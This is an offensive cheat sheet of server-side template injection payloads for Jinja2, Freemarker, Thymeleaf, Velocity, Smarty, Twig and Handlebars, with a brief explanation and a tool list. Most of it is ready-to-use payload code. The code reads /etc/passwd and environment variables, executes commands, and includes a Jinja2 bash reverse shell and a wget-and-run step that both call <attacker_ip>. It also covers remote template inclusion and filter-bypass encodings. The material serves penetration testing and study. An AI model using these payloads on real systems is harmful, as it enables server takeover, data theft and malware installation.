# Server-Side Template Injection (SSTI) Payloads Cheat Sheet

## **What is SSTI?**

Server-Side Template Injection (SSTI) occurs when user input is embedded into server-side templates without proper validation or sanitization. This allows an attacker to inject malicious template code and potentially execute arbitrary code on the server. It is a critical vulnerability that can lead to severe consequences, such as sensitive data exposure, server compromise, and even lateral movement within a network.

---

## **How Does SSTI Work?**

1. A web application accepts user input (e.g., forms, URL parameters) and processes it within a template engine.
2. If the input is embedded into templates without sanitization, an attacker can inject template expressions or arbitrary code.
3. These expressions get executed by the template engine, potentially granting the attacker access to sensitive data, files, or system commands.

### **Common Causes of SSTI**
- Directly embedding user input into templates.
- Misconfigured or overly permissive template engines.
- Lack of proper input validation or escaping mechanisms.

---

## **Template Engines and Payloads**

Below is a detailed breakdown of SSTI payloads for popular template engines:

### **Jinja2 (Python)**
#### Detecting SSTI
```jinja
{{ 7*7 }}
```
If the output returns `49`, SSTI is likely exploitable.

#### Exploitation Techniques
- **Read Arbitrary Files**
  ```jinja
  {{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
  ```
- **Command Execution**
  ```jinja
  {{ ''.__class__.__mro__[1].__subclasses__()[59]('id', shell=True, stdout=-1).communicate() }}
  ```
- **Spawn Reverse Shell**
  ```jinja
  {{ ''.__class__.__mro__[1].__subclasses__()[59]("bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'", shell=True, stdout=-1).communicate() }}
  ```

### **Freemarker (Java)**
#### Detecting SSTI
```java
${7*7}
```
#### Exploitation Techniques
- **Execute Commands**
  ```java
  ${"freemarker.template.utility.Execute"?new()("id")}
  ```
- **Read Files**
  ```java
  ${"freemarker.template.utility.ObjectConstructor"?new()("java.io.File").new("/etc/passwd").read()}
  ```

### **Thymeleaf (Java)**
#### Detecting SSTI
```html
th:text="${7*7}"
```
#### Exploitation Techniques
- **Execute Commands**
  ```html
  th:text="${T(java.lang.Runtime).getRuntime().exec('id')}"
  ```
- **Access Environment Variables**
  ```html
  th:text="${T(System).getenv()}"
  ```

### **Velocity (Java)**
#### Detecting SSTI
```java
#set($x = 7 * 7)$x
```
#### Exploitation Techniques
- **Execute Commands**
  ```java
  #set($cmd = 'id')
  #set($process = $runtime.exec($cmd))
  $process.waitFor()
  $process.exitValue()
  ```

### **Smarty (PHP)**
#### Detecting SSTI
```php
{$smarty.version}
```
#### Exploitation Techniques
- **Command Execution**
  ```php
  {system('id')}
  ```
- **Read Sensitive Files**
  ```php
  {file_get_contents('/etc/passwd')}
  ```

### **Twig (PHP)**
#### Detecting SSTI
```php
{{ 7*7 }}
```
#### Exploitation Techniques
- **Read Files**
  ```php
  {{ include('/etc/passwd') }}
  ```
- **Execute Commands**
  ```php
  {{ "id"|system }}
  ```

### Handlebars (JavaScript)
#### Detecting SSTI
```javascript
{{7*7}}
```
#### Exploitation Techniques
- **Access Objects**
  ```javascript
  {{#with "constructor" as |c|}}{{c.prototype}}{{/with}}
  ```
- **Execute Commands**
  ```javascript
  {{#with "constructor" as |c|}}{{c.constructor("return process")().mainModule.require("child_process").execSync("id").toString()}}{{/with}}
  ```

---

## Advanced Payloads for SSTI

- **Chained Exploits in Jinja2**
  ```jinja
  {{ ''.__class__.__mro__[1].__subclasses__()[59]("wget http://<attacker_ip>/malware -O /tmp/malware", shell=True).communicate() }}
  {{ ''.__class__.__mro__[1].__subclasses__()[59]("chmod +x /tmp/malware; /tmp/malware", shell=True).communicate() }}
  ```

- **Extract Environment Variables**
  ```jinja
  {{ config.items() }}
  ```

- **Remote File Inclusion in Twig**
  ```php
  {{ include("http://<attacker_ip>/payload.twig") }}
  ```

---
### Jinja2 - Filter Bypass

```python
request.__class__
request["__class__"]
```

Bypassing `_`:

```python
http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_

{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["__","class","__"]|join)}}
{{request|attr("__class__")}}
{{request.__class__}}
```

Bypassing `[` and `]`:

```python
http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_
or
http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_
```

Bypassing `|join`:

```python
http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
```

Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by [@SecGus](https://twitter.com/SecGus):

```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```
---

## **Automation Tools for SSTI Testing**

- **Tplmap**
  Automates the detection and exploitation of SSTI vulnerabilities across multiple engines.
  ```bash
  tplmap -u http://target.com/page --data "input={{7*7}}"
  ```

- **Burp Suite Plugins**
  Use plugins like "SSTI Hunter" to scan for template injection issues in web applications.

---

## Online resource
[Onsecurity.io](https://onsecurity.io/article/server-side-template-injection-with-jinja2/)

---
